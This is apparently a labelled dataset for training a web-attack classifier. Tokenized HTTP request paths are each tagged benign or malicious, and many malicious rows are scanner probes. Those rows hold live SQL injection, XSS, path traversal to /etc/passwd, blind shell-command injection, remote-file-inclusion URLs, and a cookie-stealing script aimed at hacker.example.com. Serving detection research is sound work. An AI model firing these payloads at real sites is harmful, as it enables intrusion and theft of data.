request	label
/ 627-sh / 	0
/ string / modo = registro & login = slaby & password = 3a91io & nombre = niseas & apellidos = paiva + romera & emaila = owens @ provider . com . br & dni = 74056042k & direccion = aigua + marina + 91 ,  +  & ciudad = chercos & cp = 40421 & provincia = segovia & ntc = 8044294456559903 & b1 = registrar 	1
"/ 0z575z74 . php3 ?  < meta http-equiv = set-cookie content =  "" testuhsv = 9753 ""  > "	1
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo zstlvq )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  & "	1
/ examples / jsp / num / zml . cgi ? file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = corredera alta de san pablo ,  11 	0
/ quote-left / 	0
/ 1921053690 / 	0
/ ineulande / 	0
/ nbasic_1 / 	0
/ string / strings / parameters = aldebaran 8 	0
"/ en-us /  < meta http-equiv = set-cookie content =  "" testfutf = 1550 ""  > "	1
/ la_sunday / 	0
/ string / id = 3 & nombre = vino + rioja & precio = any ?   set-cookie :  + tamper = 1041264011025374727   & cantidad = 11 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = 70996380a 	0
/ help . php ? q =  ; sleep 9  # 	1
/ entdata / 	0
/ aliens-0 / 	0
/ javascript / poc . cc 	0
/ ju0u7kfo . asp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 119068 / 	0
/ label_3496 / 	0
"/ string / strings / parameters = ""   str =  $  ( echo nneaqo )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  # "	1
/ string / modo = registro & login = kenna & password = a6e7i519374n & nombre = pola & apellidos = padral + gracida & email = kubrick . blessed @ suardistec . ee & dni = 26150430m & direccion = calle + garci-perez + 41 ,  + 9 ? c & ciudad = altafulla & cp = 14859 & provincia = zaragoza & ntc = 4928753717678188 & b1 = registrar 	0
"/ string / strings / parameters = ;  str =  $  ( echo jhaatd )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ vjbrrppi . html ?  < script > cross_site_scripting . nasl <  / script > 	1
/ sb114610565819237281 / 	0
/ tikiwiki / tiki-graph_formula . php ? w = 1 & h = 1 & s = 1 & min = 1 & max = 2 & f [  ]  = x . tan . phpinfo (  )  & t = png & title = http :  /  / cirt . net / rfiinc . txt ? 	1
/ 043718 / 	0
/ 261845 / 	0
/ examples / jsp / sessions / welcome . php ? custom_welcome_page =  / etc / passwd \ x00 	1
"/ string / modo = registro & login = corissa & password = cipresino & nombre = cenobio & apellidos = la + ringa + chinchilla & email = plate @ pecher . mx & dni = 16052504e & direccion = torres + quevedo ,  + 143 + 10 ? b & ciudad = casas + de + juan + nez & cp = 31480 & provincia =  < script > alert (  "" paros ""  )  ;  <  / script >  & ntc = 1974630082144363 & b1 = registrar "	1
/ javascript / creator . jar 	0
/ c03222000_ct322-00 / 	0
/ string / strings / parameters = crosby 	0
/ javascript / htdoc . exe 	1
/ edv3mapy . idc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ venturi-eclectic_3jpg / 	0
/ mabry ras-x v1 / 	0
/ cingular / 	0
/ string / strings / parameters = 1 '  )  ; select sleep ( 5 )  and  (  ' qcsv '  =  ' qcsv 	1
/ lib / classes / swift / mime / simplemimeentity . php . 1 	0
/ aug2006 / 	0
/ javascript / global . lib 	0
/ string / strings / parameters = vid y barrios ,  la 	0
/ 140184 / 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' wszt '  from dual where 6854 = 6854 and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  )  |  |  ' 	1
/ script / ident / identification . php ? path_inc = http :  /  / cirt . net / rfiinc . txt ? 	1
/ string / strings / parameters = 1 '  )  )  )  and 3824 = benchmark ( 5000000 , md5 ( 0x76555642 )  )  and  (  (  (  ' zurf '  =  ' zurf 	1
/ kid_inter / 	0
/ string / strings / parameters = torreblacos 	0
/ main . php ? stuff = rm ; q96335299 & rem ; 	1
/ string / strings / parameters = 1 )  )  as myyh where 5116 = 5116 or 7427 = dbms_pipe . receive_message ( chr ( 116 )  |  | chr ( 87 )  |  | chr ( 90 )  |  | chr ( 109 )  , 5 )  -- 	1
/ javascript / procedures . tar 	0
/ string / strings / parameters = 32520 	0
/ natopfp / 	0
"/ string / strings / parameters = 1 ""  ""  )  where 5828 = 5828 or 8384 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- "	1
"/ string / strings / parameters = < script > document . cookie =  "" testvlau = 8517 ;  ""  <  / script > "	1
/ 1909136068 / 	0
/ outpost-download / 	0
/ en-us / account / sysinfo . cgi ? action = systemdoc & name = sysinfo_name_cmd_exec . nasl ; id 	1
/ javascript / compat . old 	0
"/ string / strings / parameters = 1 ""  ""  )  waitfor delay  ' 0 : 0 : 5 '  -- "	1
"/ help . php ? q =  ""  & uname  > q34212187  # "	1
/ string / strings / parameters = 80819303v 	0
/ phpmyadmin / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ winnt \ win . ini 	1
/ string / strings / parameters = 29579903v 	0
"/ string / strings / parameters = ""   str =  $  ( echo lzsvgk )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi "	1
/ ca-cases / 	0
/ treatybodies / 	0
/ javascript / wtai . 7z 	0
/ string / strings / parameters = 1 rlike  ( select  ( case when  ( 8911 = 5301 )  then 1 else 0x28 end )  )  #  pmuh 	1
"/ hipkz026 . pl ?  < meta http-equiv = set-cookie content =  "" testyrbs = 2855 ""  > "	1
/ 2141487 / 	0
/ shower_tanning / 	0
/ comint / 	0
/ string / modo = registro & login = tsuyoshi & password = tas9go & nombre = zanobia & apellidos = amescua & email = rougerie @ cincocolores . sd & dni = 88684338h & direccion = plaza + de + la + sevillana ,  + 81 ,  + 5-e & ciudad = altorricn & cp = 46128 & provincia = huesca & ntc = 7892581903274474 & b1 = registrar 	0
/ string / strings / parameters = < div style = width : 1px ; filter : glow onfilterchange = javascript : alert ( 1 )  > x 	1
/ 003455 / 	0
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo nwayiz )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ "	1
/ string / str =  $  ( echo wbnibq )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ string / modo = insertar & precio = 7896 & b1 = pasar + por + caja 	0
/ phpmyadmin / index . php ? configfile =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ 25483195 / 	0
/ dsa-1042 / 	0
/ string / modo = insertar ' injected_param & precio = 5798 & b1 = confirmar 	1
/ nuh3zirz . x ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = -6984 order by 1 # 	1
"/ string / strings / parameters = ""  & echo $ ifszrbhja $  (  ( 51 + 20 )  )  $  ( echo $ ifszrbhja ) zrbhja \ "	1
/ examples / jsp / sessions / phf ? qalias = x \ x0a / bin / cat  / etc / passwd 	1
/ dc - shenmue 2 cd4 / 	0
/ 010374 / 	0
/ fortune_20061127 / 	0
/ string / id = 2 & nombre = vino + rioja & precio = 39 & cantidad = 25 & b1 = sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi-bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script > 	1
/ string / strings / parameters = yan-zhen 	0
/ string / strings / parameters = '   str =  $  ( echo fplfhr )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ spacer_03 / 	0
/ javascript / setup . tgz 	0
/ liverpool-fc / 	0
/ uh3_06 / 	0
/ 061215 / 	0
"/ 8t9v8k7x . idc ?  < script > document . cookie =  "" testhvje = 9403 ;  ""  <  / script > "	1
/ string / strings / parameters = 1 '  )  )  )  or 4411 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  (  (  (  ' narn '  =  ' narn 	1
/ 15122127 / 	0
/ string / strings / parameters = telma 	0
/ 155381 / 	0
/ string / strings / parameters = &  & echo rbczeh $  (  ( 34 + 18 )  )  $  ( echo rbczeh ) rbczeh \ 	1
/ nav_valueadd / 	0
/ vistablog / 	0
"/ string / strings / parameters = 1 ""  ""  )  as ztkr where 1532 = 1532 ; select  ( case when  ( 4769 = 4769 )  then 4769 else 4769 *  ( select 4769 from mysql . db )  end )  # "	1
/ string / strings / parameters = 9842153778086197 	0
/ string / strings / parameters = '   -- 	1
/ javascript / library . jsp 	0
/ user_new_2 . php ? home = xxpathxx 	1
/ fid16dad80a86a37760b15984e22063c7f494dbbed7 / 	0
/ cheat_sheet / 	0
/ casummit-crimit / 	0
/ 57852148 / 	0
/ string / modo = registro & login = minette & password = aseguir & nombre = telmaco & apellidos = poblete + fiuza & email = messenger @ blanquillos . pk & dni = 76591879q & direccion = calle + orion + 74 ,  +  & ciudad = villazala & cp = 26291 & provincia = jan & ntc = 0861204544361308 & b1 = registrar 	0
/ string / strings / parameters = 13194 	0
/ string / strings / parameters = oziel 	0
/ kilsmur / 	0
/ string / str =  $  ( echo bgugcf )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
/ rshare / 	0
/ string / strings / parameters = topham . sperdakos5 @ forohh . ge 	0
/ javascript / 9 . sql 	0
/ jscript . php ? my_ms [ root ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  ? 	1
/ anstoss 2007_information / 	0
/ 06adco / 	0
"/ string / strings / parameters = < script >  document . getelementbyid (  "" safe123 ""  )  . setcapture (  )  ;  document . getelementbyid (  "" safe123 ""  )  . click (  )  ;   <  / script > "	1
/ javascript / jhtml . sfish 	0
/ string / strings / parameters = $  { system ( print (  ` echo ezfnse ; echo  $  (  ( 38 + 74 )  )  ; echo ezfnse ; echo ezfnse `  )  ;  )  } ezfnse 	1
/ 000043022 / 	0
/ 000067670 / 	0
/ string / id = 1 & nombre = jamn + ibrico '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & precio = 100 & cantidad = 28 & b1 = aadir + al + carrito 	1
/ tnm000018-te08 / 	0
/ string / strings / parameters = fredman6 @ cor-jet . to 	0
/ srekel / 	0
/ string / strings / parameters = yee 	0
"/ string / strings / parameters = ""  "" data : text / html ; base64 , phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4 =  ""  ""  > "	1
/ at6509081484 / 	0
/ javascript / conf . cgi 	0
/ javascript /  . perf . exe 	1
/ datasheet_dsktpmngr / 	0
/ 1126199232_355 / 	0
/ manager / admin / file_manager . php ? action = read & filename =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ 177846 / 	0
"/ string / strings / parameters = ""  |   [  1 -ne  $  ( echo mnlbvu  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | "	1
/ cache and cookie washer 4 / 	0
"/ string / strings / parameters = -6305 ""  ""  )  )  )  or 8097 = 2048 and  (  (  (  ""  "" euyy ""  ""  like  ""  "" euyy "	1
/ string / modo = entrar & login = dionisio & pwd = reclinar & remember = on & b1 = entrar 	0
/ roevcrawford / 	0
/ string / strings / parameters = 6703 	0
/ examples / jsp / checkbox / check_user_id . php ? user_id =  < script > foo <  / script > 	1
/ string / strings / parameters = cardenas_johansson @ sorority . kz 	0
/ xoops232b / htdocs / xoops_lib / modules / protector / onupdate . php ? mydirname = a (  )  {  } system (  '  /  .  / tmp / btgjhjkaao . sh +  >  +  / dev / null +  &  '  )  ;  function v 	1
/ examples / jsp / sessions / file . php ? path =  / etc / passwd \ x00 	1
/ help . php ? q =  ; 	1
/ 171987 / 	0
/ string / modo = registro & login = suat & password = puerta1entana & nombre = isis & apellidos = piera + atencia & email = cerini . ban @ g @ 2horas . coop & dni = 23679741e & direccion = calle + torre + dels + socors + 29 ,  + 11 ? e & ciudad = quiruelas + de + vidriales & cp = 34419 & provincia = burgos & ntc = 0825075702605085 & b1 = registrar 	1
/ creditcard_gr / 	0
/ 138106 / 	0
/ scriptpage / source / includes / load_forum . php ? mfh_root_path = http :  /  / 192 . 168 . 202 . 118 : 8080 / iroy1gvqrrqu ? 	1
/ digitaleye / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  ; select case when 7717 = 7717 then 1 else null end -- "	1
/ string / strings / parameters = enumer24 	0
/ frontend / x3 / htaccess / dohtaccess . html ? dir =  >  < script > alert ( 413035588065 )  <  / script > 	1
/ string / strings / parameters = 7erg47 	0
/ string / strings / parameters = ;  str =  $  ( echo ybrdji )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ 	1
"/ string / strings / parameters = <  !  --  # echo var =  "" content_type ""   --  > "	1
/ string / strings / parameters = < iframe /  *  %  %  %  %  %  %  %  *  / src =  ' javascript : vbscript :   /  *  *  /  ;  /  /  : http :  /  / www . google . com /  ?  =   /  *  *  / javascript :   /  * oleeeeeeeeeeeeeee *  / alert ( 2 )  ;  '  > 	1
"/ string / strings / parameters = 1 ""  ""  where 5334 = 5334 or exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 6270 = 6270 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  -- "	1
/ software_small / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo xdtltk )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ javascript / premium . ini 	0
/ dyndns updater_information / 	0
/ 126856 / 	0
/ string / strings / parameters = c /  cierzo ,  18 	0
/ admin / news . admin . php ? path_to_script = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  ?  & cmd = ls 	1
/ string / strings / parameters = <  !  --  [ if ]  >  < script > confirm ( 1 )  <  / script  --  > 	1
/ cgi-sys / fileseek . cgi ? foot =  & head =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd 	1
/ 20051110-10 / 	0
/ string / modo = registro & login = sarge & password = apad-r8nad5ra & nombre = adolfina & apellidos = sanmarti + challiolany ?   set-cookie :  + tamper = 1041264011025374727   & email = paolieri @ cubiertoscbb . gu & dni = 55702502k & direccion = plaa + carrasco + i + formiguera + 163 ,  +  & ciudad = saelices + de + mayorga & cp = 06890 & provincia = valencia & ntc = 1427980931123468 & b1 = registrar 	1
/ string / modo = insertar & precio = 5832 & b1 = pasar + por + caja / 	1
"/ string / strings / parameters = 1 ""  ""  where 3740 = 3740 rlike sleep ( 5 )  # "	1
"/ help . php ? q =  "" ver \ x0c > q43711515 & rem \ x0c "	1
/ anachele / 	0
/ javascript / dump . sql 	0
"/ en-us / i686v90l . php3 ?  < script > document . cookie =  "" testfutf = 1550 ;  ""  <  / script > "	1
/ string / id = 3 & nombre = jamn + ibrico & precio = 100 ' injected_param & cantidad = 38 & b1 = aadir + al + carrito 	1
/ scripts / editor / filemanager / connectors / php / upload . php ? command = fileupload & type = file & currentfolder =  / fckeditor_currentfolder_file_upload-1332010431 . php . 	1
/ 295222 / 	0
/ string / strings / parameters = ; echo $ ifscfuqon $  (  ( 7 + 1 )  )  $  ( echo $ ifscfuqon ) cfuqon | 	1
/ sechd_timesavers / 	0
/ page1366 / 	0
"/ string / strings / parameters = 1 ""  ""  where 1920 = 1920 and 8635 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  -- "	1
/ 1454404028 / 	0
"/ 0z575z74 . idc ?  < script > document . cookie =  "" testuhsv = 9753 ;  ""  <  / script > "	1
/ cgi-bin / webplus . exe ? script = webplus_install_path . nasl 	1
/ string / strings / parameters = c /  juan rabadan 27 ,  6 ? a 	0
/ seitenoptimierung / 	0
/ scripts / index . php ? op = disp & filedata = c3lzdgvtkcdpcgnvbmzpzyavywxsjyk7 	1
/ axis-cgi / 	0
/ string / strings / parameters = gibezzi scampini 	0
/ string / modo = registro & login = karels & password = destete & nombre = neleo & apellidos = tarrats + steiert & email = matterstock @ 9horas . np & dni = 60380887e & direccion = general + ricardos + 187 +  & ciudad = santa + cruz + de + la + palma & cp = 31271 & provincia = palencia & ntc = 7910538337072686 & b1 = registrar 	0
/ rel_30 / 	0
/ messages / 	0
/ string / strings / parameters = &  & echo $ ifsbtzbfi $  (  ( 26 + 9 )  )  $  ( echo $ ifsbtzbfi ) btzbfi \  \ 	1
/ string / strings / parameters = 50163 	0
/ trendmicro_phishing / 	0
/ string / strings / parameters = tierra 17 	0
"/ string / strings / parameters = < a href =  ""  #  ""  onclick =  "" var a  =  ' foo & apos ;  ;  alert ( 1 )  ;  /  /  '  ""  > click me <  / a > "	1
/ phprocketaddin /  ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini 	1
/ javascript / csv . pfx 	0
/ string / modo = registro & login = jozef & password = ve9derse & nombre = tahiel & apellidos = ortiz + narvarte & email = lemontier @ viajesnacionales . kp & dni = 70721027y & direccion = calle + virgen + de + la + hoz ,  + 123 + 4-b & ciudad = borrass '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' % & cp = 44564 & provincia = zaragoza & ntc = 7002955624204925 & b1 = registrar 	1
/ trojperdad / 	0
/ string / strings / parameters = scriptalert ( 1 )  / script 	1
/ 582380 / 	0
/ o6ebbirj . html ?  < script > cross_site_scripting . nasl <  / script > 	1
/ current / modules . php ? mod = fm & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & bn = fm_d1 	1
/ information_asymmetry / 	0
/ watch-dog / 	0
/ string / strings / parameters = echo eeiypu $  (  ( 65 + 19 )  )  $  ( echo eeiypu ) eeiypu | 	1
/ jean_baudrillard / 	0
/ string / strings / parameters = mankowsk 	0
/ miisearchlogo / 	0
/ temperature / 	0
/ string / strings / parameters = 16127 	0
/ string / strings / parameters = 1 '  )  )  )  or 6979 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- 	1
/ string / strings / parameters = 47330 	0
"/ j4rdyhw8 . php3 ?  < meta http-equiv = set-cookie content =  "" testrluj = 1420 ""  > "	1
/ scripts / index . php ? x = browse & category =  ' union select  ' 1 '  ,  ' 2 '  ,  ' pixelpost_category_sql_injection . nasl '  ,  ' 1331919009 '  ,  ' 5 '  -- 	1
/ string / strings / parameters = lli de vall 	0
/ string / strings / parameters = comalada 	0
/ template . php ? content_page = http :  /  / test . acunetix . com / acunetix_not_execute ? 	0
"/ string / strings / parameters = & echo wqltxv $  (  ( 0 + 25 )  )  $  ( echo wqltxv ) wqltxv "" "	1
/ string / strings / parameters = 1 '  )  where 2852 = 2852 ; select case when 7717 = 7717 then 1 else null end -- 	1
/ one-china / 	0
/ n1afe1y6 . fts ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = -5432 '  )  as dndq where 9633 = 9633 order by 1 # 	1
/ javascript / data . yml 	0
/ 118235 / 	0
"/ main . php ? logout =  "" ping \ x0c-w \ x0c10000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 | rem \ x0c "	1
/ string / strings / parameters = 46440 	0
/ 148069 / 	0
/ browserhawk / 	0
"/ string / modo = paros ""  style =  "" background : url ( javascript : alert (  ' paros '  )  )  & precio = 7097 & b1 = confirmar "	1
/ javascript / hour . cfg 	0
/ 870116 / 	0
"/ main . php ? logout =  "" del \ x0bq77294234 & rem \ x0b "	1
/ affiliate_programs / 	0
/ ericsenf / 	0
/ bxnode / 	0
/ 372483 / 	0
/ outlook1a / 	0
/ bzuf9ozq . jsp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / sav . jsp 	0
/ string / strings / parameters = ; echo $ ifsksutzj $  (  ( 41 + 59 )  )  $  ( echo $ ifsksutzj ) ksutzj | 	1
/ 691352633 / 	0
/ way-board / way-board . cgi ? db =  / etc / passwd \ x00 	1
/ bb-admin / admin . aspx 	0
/ water_cooler / 	0
/ string / strings / parameters = 1 %  '  )  )  )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  and  (  (  (  '  %  '  =  ' 	1
/ string / strings / parameters = 0estot32 	0
/ resources / loginexec . php 	0
/ h21y8w52 . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = rosalia 	0
/ 3060000000059206 / 	0
/ javascript / iisadmpwd . html 	0
"/ string / strings / parameters = `  ""  '  >  < img src = xxx : x  \ x27onerror = javascript : alert ( 1 )  > "	1
/ msg10912540 / 	0
/ string / modo = registro & login = devy & password = ajaraca & nombre = ermelindo & apellidos = almirall + pahisa & email = leza . vanbrugh @ ajuntamentbarcelona2-0 . gq & dni = 61089913g & direccion = alvarez + 35 +  & ciudad = corulln & cp = 42250 & provincia = valencia & ntc = 4870628613160341 & b1 = registrar 	0
/ help . php ? q =  | ping ; -w ; 9000 ; -n ; 1 ; 4 . 3 . 2 . 1 | rem ; 	1
/ string / strings / parameters = 1 )  )  )  ; select pg_sleep ( 5 )  -- 	1
/ string / strings / parameters = alfalfa 4 	0
/ string / modo = insertar & precio = 4296 & b1 = confirmar / 	1
/ string / strings / parameters = 1 '  )  )  and 2853 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  (  ' esal '  =  ' esal 	1
/ uploadit / 	0
/ string / modo = registro & login = auria & password = inquisicin & nombre = vivaldo & apellidos = panell + portaneri & email = sayer @ esbien . bi & dni = 27306256n & direccion = madrid ,  + 27 +  & ciudad = logroo & cp = 43736 & provincia = ciudad + real & ntc = 6537476325760255 & b1 = registrar 	0
/ string / strings / parameters = 1 )  as cnpv where 4902 = 4902 and elt ( 1210 = 1210 , sleep ( 5 )  )  -- 	1
/ string / strings / parameters = 0646137347424943 	0
"/ string / strings / parameters = < x xmlns : ev =  "" http :  /  / www . w3 . org / 2001 / xml-events ""  ev : event =  "" load ""  ev : handler =  "" test . evt # x ""  /  > "	1
/ string / strings / parameters = primera 152 11-g 	0
/ q46113118 	0
/ javascript / ms-sql . exe 	1
/ lib / exe / indexer . php ? id = start & 1331901116 	0
/ scripts / index . php ? act = sm_window & page = event & day = -1 union select 1 , 1331919007 , 1010516896  -- 	1
/ logo_mobile / 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo ausqym )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  /  / 	1
/ string / strings / parameters = holoubek @ hojainformativas . ua 	0
/ 051159 / 	0
/ photoedwardnortonfightclub / 	0
/ scripts / ajax . php ? rs = __exp__getfeedcontent & rsargs [  ]  = -99 union select 362784712 , 2 , 1572590489 , 4 , 5 , 6 , 7 , 8 , 9 , 0 , 1 , 2 , 3  -- 	1
/ cgi-bin / p-news . php 	0
/ string / modo = entrar & login = vicente & pwd = gen7o & remember = off & b1 = entrar 	0
/ string / modo = entrar & login = rolando & pwd = acr7m6nia & remember = off & b1 = entrar 	0
/ string / modo = insertar & precio = 6264 & b1 = confirmar 	0
/ easyregex / 	0
/ nhra drag racing_information / 	0
/ 193029_1 / 	0
/ string / strings / parameters = forns rigall 	0
/ applejuice / 	0
/ encryption primer / 	0
/ choicepoint_vs / 	0
/ string / modo = registro & login = sandi & password = mo3e5e5o & nombre = sin & apellidos = palls + de + buran & email = skaff @ hipersevilla . nc & dni = 98089077b & direccion = calle + puerta + del + sol ,  + 88 ,  +  & ciudad = grijota & cp = 32520 & provincia = zaragoza & ntc = 7926381447140293 & b1 = registrar 	0
/ string / strings / parameters = barkwill8 	0
/ javascript / contacts . vb 	0
/ guardian_unlimited / 	0
/ javascript / document . lib 	1
/ string / modo = insertar & precio = 368 & b1 = confirmar 	0
/ string / id = 2 & nombre = queso + manchego & precio = 100 & cantidad = 34 & b1 =  ? 	1
"/  ?  < script > document . cookie =  "" testfuqi = 4189 ;  ""  <  / script > "	1
/ javascript / replicate . cc 	0
/ string / strings / parameters = calle pintor julian alcaraz ,  108 ,  10-a 	0
/ string / strings / parameters = saunders @ titulosoficiales . web 	0
/ examples / jsp / colors / lib / authform . inc . php ? path_pre =  / etc / passwd \ x00 	1
/ 734275415 / 	0
/ javascript / record . asp 	0
/ cgi-915 / windmail . exe 	1
/ index . php ? module = topics & func = view & topicid = -1 union select null , null ,  ' mdpro_topicid_sql_injection . nasl-1331919183 '  , null , null , null , null  -- 	1
/ boxmis_62x72 / 	0
/ brannmur / 	0
"/ string / strings / parameters = "" echo $ ifsnikgbf $  (  ( 93 + 83 )  )  $  ( echo $ ifsnikgbf ) nikgbf | "	1
/ javascript / dl . log 	0
/ string / strings / parameters = koichi 	0
/ string / strings / parameters = 1 '  )  as rqzz where 4987 = 4987 or char ( 68 )  |  | char ( 69 )  |  | char ( 97 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 )  , 0 )  , 5000000000 )  , null )  -- 	1
/ string / strings / parameters = lacasse 	0
"/ managersearch_results . dot ? search_query = nessus ""  >  < script > alert (  ' dotcms_search_query_xss . nasl '  )  <  / script >  / "	1
/ sf00000_ / 	0
/ string / strings / parameters = 62123000t 	0
/ top . php ? stuff =  @  ' 	1
/ string / strings / parameters = rabulas 	0
/ 7285339 / 	0
/ string / modo = insertar & precio = 8322 & b1 = confirmar 	0
/ string / modo = registro & login = hatti & password = vituperador & nombre = guiliano & apellidos = cmara + dovale & email = tiensuwan @ zarasalud . py & dni = 84598781c & direccion = p + laa + joan + corrades + i + bo + sch ,  + 8 * 4 ,  +  & ciudad = lloar ,  + el & cp = 24170 & provincia = valladolid & ntc = 4582509168680893 & b1 = registrar 	1
/ string / id = 3 & nombre = jamn '  + ibric- ' o & precio = 100 & cantidad = 47 & b1 = aadir + al + carrito 	1
/ 178692 / 	0
/ string / strings / parameters = 27643638f 	0
/ string / strings / parameters = sandie 	0
/ sidebarytlogo / 	0
/ edzaia0i . jsp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = rowan_oldman @ kpincentives . pn 	0
/ passat-bra / 	0
/ article888824 / 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo yqnajz )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  /  / 	1
/ javascript / x . c 	0
/ winsk20 / 	0
/ string / strings / parameters = 2301580169203669 	0
/  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  { file } 	1
/ 133432a / 	0
/ assaleh / 	0
/ klingeltonpacket / 	0
